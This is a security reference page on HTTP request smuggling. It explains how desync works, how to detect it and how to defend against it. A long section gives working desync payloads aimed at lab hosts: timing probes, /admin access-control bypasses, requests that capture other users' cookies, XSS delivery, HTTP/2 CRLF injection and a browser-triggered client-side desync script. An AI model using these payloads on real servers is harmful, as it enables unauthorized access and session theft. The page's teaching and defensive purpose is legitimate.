# HTTP Request Smuggling

> Front/back-end disagree on request boundaries, letting requests be smuggled. **Deep dive:** [`Troubleshooting_Guide/http_request_smuggling.md`](../../../../Troubleshooting_Guide/http_request_smuggling.md) · **Skill:** [`ai_framework/skills/`](../../../ai_framework/skills/README.md)

**Aliases / OWASP:** Desync · A05:2021
**Status:** complete

## What it is
HTTP request smuggling (HTTP desync) occurs when a front-end server (proxy, load balancer, CDN)
and a back-end server disagree about where one request ends and the next begins. The attacker
exploits that disagreement to "smuggle" part of one request so it is interpreted as the start of
the next request on the shared connection.

## How it works
HTTP/1.1 offers two ways to declare body length — `Content-Length` and `Transfer-Encoding:
chunked`. If two hops on the path prioritize different headers (or one mishandles obfuscated/
duplicate headers), the front-end and back-end parse the byte stream into different request
boundaries. The attacker crafts a body whose trailing bytes the back-end treats as a fresh
request prefix, which then gets prepended to the next user's request on the reused connection.
HTTP/2 downgrade and CL.0 variants exploit the same boundary confusion in different framings.

## Impact
Smuggled prefixes bypass front-end security controls (reaching `/admin`), poison the shared
response queue so victims receive attacker-controlled responses, capture other users' requests
including session cookies, and deliver stored/reflected XSS to whoever's request lands next. It
frequently escalates to full account takeover and is rated high to critical.

## How to detect
- Timing probes: an incomplete-chunked body that one hop waits on causes a measurable delay
  (~5–10s) when the back-end honors `Transfer-Encoding`.
- Differential response: smuggle a request for a non-existent path and watch a following benign
  request return an unexpected 404 (confirms the desync).
- Try TE obfuscation (trailing space, tab, line-folding, duplicate/bogus TE values) and observe
  which hop stops honoring chunked. Use tools like Burp's HTTP Request Smuggler / Turbo Intruder.

## Exploitation (summary)
Identify the variant (CL.TE, TE.CL, TE.TE, H2.TE/CL, CL.0) with timing and 404 probes, then send
a request whose body contains a complete smuggled request line and headers. The back-end consumes
the prefix and applies it to the next connection user — letting you reach restricted paths, poison
the response queue, or capture victim requests. Lengths must be byte-exact; full payloads and
length math are in the Payloads section.

## Payloads & techniques
> Distilled from field payload references — for authorized testing only.

### Variant reference
The desync class depends on which length signal each hop trusts.

| Variant | Front-end reads | Back-end reads |
|---------|-----------------|----------------|
| CL.TE   | Content-Length | Transfer-Encoding |
| TE.CL   | Transfer-Encoding | Content-Length |
| CL.0    | Content-Length | Ignores body |
| H2.TE   | HTTP/2 framing | TE header injected |
| H2.CL   | HTTP/2 (no CL) | CL header forwarded |

### Timing probes (detect the desync)
Non-destructive way to tell which hop trusts TE before crafting a full desync.

```http
POST / HTTP/1.1
Host: TARGET
Content-Length: 4
Transfer-Encoding: chunked

1
A
X
```

Delay (~10s) means the **back-end uses TE** → CL.TE/TE.CL territory. The mirror probe:

```http
POST / HTTP/1.1
Host: TARGET
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

Delay means the **front-end uses TE, back-end uses CL** → CL.TE potential.

### CL.TE / TE.CL / TE.TE desync
Front-end uses CL, back-end uses TE (send twice; second response: `Unrecognized method GPOST`):

```http
POST / HTTP/1.1
Host: TARGET.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

TE.CL — front-end uses TE, back-end uses CL (disable "Update Content-Length" in Burp):

```http
POST / HTTP/1.1
Host: TARGET.web-security-academy.net
Content-length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

TE.TE — both hops support TE, so obfuscate the header so only one stops honoring it:

```http
POST / HTTP/1.1
Host: TARGET.web-security-academy.net
Content-length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

Other TE-obfuscation variants to fuzz:

```text
Transfer-Encoding: xchunked
Transfer-Encoding : chunked     (trailing space before colon)
Transfer-Encoding:	chunked     (tab before value)
Transfer-Encoding
  : chunked                     (line folding)
```

### Confirm via differential response
Smuggle a request for a non-existent path; the next benign request returns 404.

```http
POST / HTTP/1.1
Host: TARGET.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X
```

TE.CL form (`0x5e` = 94 bytes from `POST /404` to end of `x=1`):

```http
POST / HTTP/1.1
Host: TARGET.web-security-academy.net
Content-length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

### Bypass front-end controls (reach /admin)
The smuggled prefix is processed by the back-end, skipping the front-end's access rules.

```http
POST / HTTP/1.1
Host: TARGET.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

TE.CL form (`0x71` = 113 bytes):

```http
POST / HTTP/1.1
Host: TARGET.web-security-academy.net
Content-length: 4
Transfer-Encoding: chunked

71
POST /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

If the front-end rewrites requests (e.g. injecting a client-IP header), first leak the rewritten header name, then reuse it:

```http
POST / HTTP/1.1
Host: TARGET.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 124
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
Connection: close

search=test
```

The response leaks something like `X-vVNGcR-Ip: <front-end IP>`. Spoof it to localhost:

```http
POST / HTTP/1.1
Host: TARGET.web-security-academy.net
Content-Length: 143
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-vVNGcR-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Connection: close

x=1
```

### Attacking other users
Capture a victim's in-flight request by smuggling an oversized comment body; increment CL (400/600/800) until the full request (with cookies) is captured.

```http
POST / HTTP/1.1
Host: TARGET.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 256
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=YOUR-SESSION

csrf=YOUR-CSRF&postId=5&name=x&email=x@x.com&website=&comment=test
```

Reflected XSS delivered to whoever's request is next in the queue:

```http
POST / HTTP/1.1
Host: TARGET.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Transfer-Encoding: chunked

0

GET /post?postId=5 HTTP/1.1
User-Agent: a"/><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
```

### HTTP/2 desync
H2.TE response-queue poisoning — confirm (every second request returns 404), then fish for an admin 302:

```http
POST / HTTP/2
Host: TARGET.web-security-academy.net
Transfer-Encoding: chunked

0

SMUGGLED
```

```http
POST /x HTTP/2
Host: TARGET.web-security-academy.net
Transfer-Encoding: chunked

0

GET /x HTTP/1.1
Host: TARGET.web-security-academy.net

```

H2.CL — a forwarded Content-Length splits the H2 body:

```http
POST / HTTP/2
Host: TARGET.web-security-academy.net
Content-Length: 0

SMUGGLED
```

H2 CRLF injection — smuggle via a header value (in Burp Inspector, Shift+Enter inserts a real `\r\n`):

```text
Name:  foo
Value: bar\r\n Transfer-Encoding: chunked
```

```http
0

POST / HTTP/1.1
Host: TARGET.web-security-academy.net
Cookie: session=YOUR-SESSION
Content-Length: 800

search=x
```

Full request splitting via the same vector (point the path at a non-existent `/x`):

```text
Name:  foo
Value: bar\r\n \r\n GET /x HTTP/1.1\r\n Host: TARGET.web-security-academy.net
```

### CL.0 and client-side desync
Some endpoints (often static files) ignore the body — the back-end treats the "body" as a new request. Send two requests on one keep-alive connection:

```http
POST /resources/images/blog.svg HTTP/1.1
Host: TARGET.web-security-academy.net
Cookie: session=YOUR-SESSION
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

GET /hopefully404 HTTP/1.1
Foo: x
```

```http
GET / HTTP/1.1
Host: TARGET.web-security-academy.net
```

If request 2 returns 404, CL.0 is confirmed; swap the smuggled prefix for `GET /admin/delete?username=carlos`. A CL.0 vector that the victim's own browser can trigger (client-side desync):

```javascript
fetch("https://TARGET.h1-web-security-academy.net", {
  method: "POST",
  body: "GET /hopefully404 HTTP/1.1\r\nFoo: x",
  mode: "cors",
  credentials: "include",
}).catch(() => {
  fetch("https://TARGET.h1-web-security-academy.net", {
    mode: "no-cors",
    credentials: "include",
  });
});
```

### Length calculation
Content-Length counts every byte after the blank line separating headers from body — e.g. `0\r\n\r\nGET /404 HTTP/1.1\r\nX-Ignore: X` = 35 bytes. The TE.CL chunk size (hex) counts all bytes of the smuggled request from its start line through the end of its body — e.g. the `POST /404` block above = 94 bytes = `0x5e`.

## Defenses
1. Use HTTP/2 end-to-end and never downgrade to HTTP/1.1 between front-end and back-end (the
   single most effective mitigation).
2. Normalize requests at the front-end: reject any request that contains both `Content-Length`
   and `Transfer-Encoding`, or any malformed/obfuscated TE header, rather than forwarding it.
3. Make front-end and back-end use the identical, strict parser for length determination, so they
   can never disagree on request boundaries.
4. Disable connection reuse to the back-end (or use a fresh connection per request) where
   feasible to limit cross-request impact.
5. Keep proxies, CDNs, and web servers patched, since many desync bugs are vendor parser flaws.

## Finding CVEs from scratch
- **NVD** — https://nvd.nist.gov/vuln/search?query=HTTP+Request+Smuggling
- **CVE.org** — https://www.cve.org/CVERecord/SearchResults?query=HTTP+Request+Smuggling
- **Exploit-DB** — https://www.exploit-db.com/search?q=HTTP+Request+Smuggling
- **GitHub Advisories** — https://github.com/advisories?query=HTTP+Request+Smuggling
- **OSV** — https://osv.dev/list?q=HTTP+Request+Smuggling
- **Community** — r/netsec, vendor security blogs, HackerOne Hacktivity, X/Twitter infosec.
- _Query tip: add the target product + version, e.g. `HTTP Request Smuggling <product> <version>`._

## Notable CVEs
_Illustrative — verify against NVD before relying on details._
- `CVE-2019-18277` — HAProxy request smuggling via mishandled `Transfer-Encoding`.
- `CVE-2021-33193` — Apache HTTP Server (mod_proxy/HTTP/2) request smuggling enabling cache
  poisoning and access-control bypass.
- `CVE-2022-1388` (context) and the broader 2019 work: PortSwigger's "HTTP Desync Attacks"
  research (James Kettle) is the canonical real-world body of mass-exploitable smuggling cases.

## References
- PortSwigger Web Security Academy — HTTP request smuggling: https://portswigger.net/web-security/request-smuggling
- OWASP — HTTP Request Smuggling (WSTG / OWASP wiki): https://owasp.org/www-community/attacks/HTTP_Request_Smuggling
- RFC 7230 §3.3.3 and RFC 9112 §6 — HTTP/1.1 message body length precedence rules.
